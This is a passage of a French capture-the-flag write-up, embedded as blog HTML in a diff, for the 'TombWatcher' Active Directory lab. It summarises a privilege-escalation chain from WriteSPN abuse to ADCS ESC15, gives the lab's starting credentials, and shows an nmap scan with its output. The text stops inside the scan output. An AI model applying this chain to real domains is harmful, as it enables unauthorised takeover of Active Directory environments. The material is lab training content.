@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>TombWatcher - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/tombwatcher/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="TombWatcher">
+  <meta property="og:description" content="TombWatcher est une machine Active Directory de difficulté medium de type assumed breach. Je commencerai donc avec les identifiants henry:H3nry_987TGV!. L’énumération avec BloodHound révèle que Henry dispose des privilèges WriteSPN sur Alfred, qui dispose des privilèges AddSelf sur le groupe Infrastructure. Les membres de ce groupe disposent des privilèges ReadGMSAPassword sur le compte ansible_dev. Ce dernier dispose des privilèges ForceChangePassword sur l’utilisateur Sam, qui dispose des privilèges WriteOwner sur John ce qui nous permet d’avoir un shell. Une fois connecté, nous remarquons qu’il y a des objets supprimés avec le même nom de compte cert_admin. À partir de cet utilisateur, j’exploiterai le scénario B de ESC15 dans l’environnement ADCS pour obtenir un shell en tant qu’Administrateur.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="ESC15">
+    <meta property="article:tag" content="ADCS">
+    <meta property="article:tag" content="ReadGMSAPassword">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="TombWatcher">
+  <meta name="twitter:description" content="TombWatcher est une machine Active Directory de difficulté medium de type assumed breach. Je commencerai donc avec les identifiants henry:H3nry_987TGV!. L’énumération avec BloodHound révèle que Henry dispose des privilèges WriteSPN sur Alfred, qui dispose des privilèges AddSelf sur le groupe Infrastructure. Les membres de ce groupe disposent des privilèges ReadGMSAPassword sur le compte ansible_dev. Ce dernier dispose des privilèges ForceChangePassword sur l’utilisateur Sam, qui dispose des privilèges WriteOwner sur John ce qui nous permet d’avoir un shell. Une fois connecté, nous remarquons qu’il y a des objets supprimés avec le même nom de compte cert_admin. À partir de cet utilisateur, j’exploiterai le scénario B de ESC15 dans l’environnement ADCS pour obtenir un shell en tant qu’Administrateur.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/tombwatcher/" /><link rel="prev" href="http://localhost:1313/trick/" /><link rel="next" href="http://localhost:1313/thefrizz/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TombWatcher",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/tombwatcher\/"
+        },"genre": "posts","keywords": "Medium, Windows, Active Directory, ESC15, ADCS, ReadGMSAPassword, ForceChangePassword, Targeted Kerberoasting, WriteOwner, WriteSPN","wordcount":  2395 ,
+        "url": "http:\/\/localhost:1313\/tombwatcher\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">TombWatcher</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;2395 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#smb---tcp-445">SMB - TCP 445</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-john">Shell as john</a>
+      <ul>
+        <li><a href="#bloodhound">BloodHound</a></li>
+        <li><a href="#targeted-kerberoasting-on-alfred">Targeted Kerberoasting on Alfred</a></li>
+        <li><a href="#add-alfred-in-infrastructure-group">Add Alfred in Infrastructure group</a></li>
+        <li><a href="#gmsareadpassword">GMSAReadPassword</a></li>
+        <li><a href="#forcechangepassword">ForceChangePassword</a></li>
+        <li><a href="#writeowner">WriteOwner</a></li>
+        <li><a href="#evil-winrm">Evil-WinRM</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-administrator">Shell as administrator</a>
+      <ul>
+        <li><a href="#cert_admin-recover">cert_admin recover</a></li>
+        <li><a href="#esc15---plan-b">ESC15 - Plan B</a></li>
+        <li><a href="#evil-winrm-1">Evil-WinRM</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/tombwatcher.png"
+        data-srcset="/images/TombWatcher/tombwatcher.png, /images/TombWatcher/tombwatcher.png 1.5x, /images/TombWatcher/tombwatcher.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/tombwatcher.png"
+        title="TombWatcher" width="863" height="307" /></p>
+<p><code>TombWatcher</code> est une machine Active Directory de difficulté medium de type <code>assumed breach</code>.  Je commencerai donc avec les identifiants <code>henry:H3nry_987TGV!</code>. L’énumération avec <code>BloodHound</code> révèle que <strong>Henry</strong> dispose des privilèges <code>WriteSPN</code> sur <strong>Alfred</strong>, qui dispose des privilèges <code>AddSelf</code> sur le groupe <strong>Infrastructure</strong>. Les membres de ce groupe disposent des privilèges <code>ReadGMSAPassword</code> sur le compte <strong>ansible_dev</strong>. Ce dernier dispose des privilèges <code>ForceChangePassword</code> sur l&rsquo;utilisateur <strong>Sam</strong>, qui dispose des privilèges <code>WriteOwner</code> sur <strong>John</strong> ce qui nous permet d&rsquo;avoir un shell. Une fois connecté, nous remarquons qu&rsquo;il y a des objets supprimés avec le même nom de compte <strong>cert_admin</strong>. À partir de cet utilisateur, j’exploiterai le scénario B de <code>ESC15</code> dans l’environnement <code>ADCS</code> pour obtenir un shell en tant qu’Administrateur.</p>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<p>Il y a plusieurs ports ouverts.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap 10.129.25.88 --min-rate <span class="m">5000</span> -Pn -sV -sC -vv -p- -oN Nmap.txt</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PORT      STATE SERVICE       REASON          VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        syn-ack ttl <span class="m">127</span> Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp    open  http          syn-ack ttl <span class="m">127</span> Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: IIS Windows Server
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  syn-ack ttl <span class="m">127</span> Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-06-09 01:59:02Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   syn-ack ttl <span class="m">127</span> Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-06-09T02:00:35+00:00<span class="p">;</span> +4h00m00s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>tombwatcher-CA-1/domainComponent<span class="o">=</span>tombwatcher
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2025-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   a3964dc0104d3c5854e019e3c2ae0666
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: fe5e76e2d5284a338adfc84e92e3900e4234ef9c
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
+</span></span><span class="line"><span class="cl"><span class="p">|</span> WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
+</span></span><span class="line"><span class="cl"><span class="p">|</span> XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
+</span></span><span class="line"><span class="cl"><span class="p">|</span> IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
+</span></span><span class="line"><span class="cl"><span class="p">|</span> hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
+</span></span><span class="line"><span class="cl"><span class="p">|</span> DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
+</span></span><span class="line"><span class="cl"><span class="p">|</span> U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
+</span></span><span class="line"><span class="cl"><span class="p">|</span> UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds? syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    syn-ack ttl <span class="m">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>tombwatcher-CA-1/domainComponent<span class="o">=</span>tombwatcher
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2025-11-16T00:47:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   a3964dc0104d3c5854e019e3c2ae0666
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: fe5e76e2d5284a338adfc84e92e3900e4234ef9c
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
+</span></span><span class="line"><span class="cl"><span class="p">|</span> WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
+</span></span><span class="line"><span class="cl"><span class="p">|</span> XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
+</span></span><span class="line"><span class="cl"><span class="p">|</span> IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
+</span></span><span class="line"><span class="cl"><span class="p">|</span> hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
+</span></span><span class="line"><span class="cl"><span class="p">|</span> DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
+</span></span><span class="line"><span class="cl"><span class="p">|</span> U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
+</span></span><span class="line"><span class="cl"><span class="p">|</span> UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-06-09T02:00:34+00:00<span class="p">;</span> +4h00m00s from scanner time.
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-06-09T02:00:35+00:00<span class="p">;</span> +4h00m00s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.tombwatcher.htb
